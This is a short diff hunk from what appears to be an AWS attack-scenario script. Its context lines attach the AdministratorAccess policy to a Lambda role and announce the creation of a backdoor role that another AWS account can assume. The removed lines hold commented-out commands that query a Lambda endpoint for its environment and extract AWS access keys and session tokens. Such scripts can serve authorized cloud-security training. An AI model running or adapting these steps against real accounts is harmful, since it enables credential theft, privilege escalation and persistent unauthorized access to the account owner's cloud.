@@ -160,9 +160,6 @@ def scenario_2_execute():
     print("-"*30)
     subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME+"", shell=True)
     
-    #Update Creds
-    #subprocess.call("curl '"+API_GW_URL+"?query=env' | grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN >> updated_token.txt", shell=True)
-    #creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN updated_token.txt)"
     sleep(60)
     subprocess.call("curl '"+API_GW_URL+"?query=ping'", shell=True)
     print(colored("Creating a Backdoor Role which can be assumed from custom AWS account", color="red"))
